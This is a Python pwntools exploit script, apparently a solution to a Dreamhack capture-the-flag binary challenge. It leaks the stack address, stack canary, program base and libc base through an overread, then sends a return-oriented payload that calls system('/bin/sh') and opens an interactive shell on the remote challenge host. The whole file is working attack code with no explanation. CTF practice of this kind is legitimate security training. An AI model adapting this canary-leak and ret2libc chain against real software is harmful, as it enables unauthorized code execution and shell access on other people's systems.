#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./prob_patched', checksec=False)
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

gs = """
decompiler connect ida --host 172.19.176.1 --port 3662
b *main
b *run
b *run+217
b *run+291
b *run+323
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        #return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path}, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 21283)
    else:
        return process(elf.path)
        #return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def read(leak):
    s(b'1.')
    if leak:
      info("LEAK")  
    else:
        rcu(b'> ')

def write(data):
    s(b'2.')
    sa(b'Write: .\n', data)
    rcu(b'> ')

def clea():
    s(b'3.')
    rcu(b'> ')


io = start()
rcu(b'> ')

write(b'a' * 256)

read(True)
rcu(b'a' * 256)
stack_base = unpack(io.recvn(8)) - 0x200c9
canary = unpack(io.recvn(8))
io.recvn(8)
elf.address = unpack(io.recvn(8)) - 0x14d9
io.recvn(8)
libc.address = unpack(io.recvn(8)) - 0x29d90
rcu(b'> ')
success(f"stack @ {hex(stack_base)}")
success(f"canary @ {hex(canary)}")
success(f"elf @ {hex(elf.address)}")
success(f"libc @ {hex(libc.address)}")

ret = pack(libc.address + 0x0000000000029cd6)
poprdi_ret = pack(libc.address + 0x000000000002a3e5)
binsh = pack(next(libc.search(b"/bin/sh\x00")))
system = pack(libc.sym['system'])
payload = cyclic(24) + pack(canary) + cyclic(8) + ret + poprdi_ret + binsh + system + b'.'

s(payload)
sl(b'id')
io.interactive()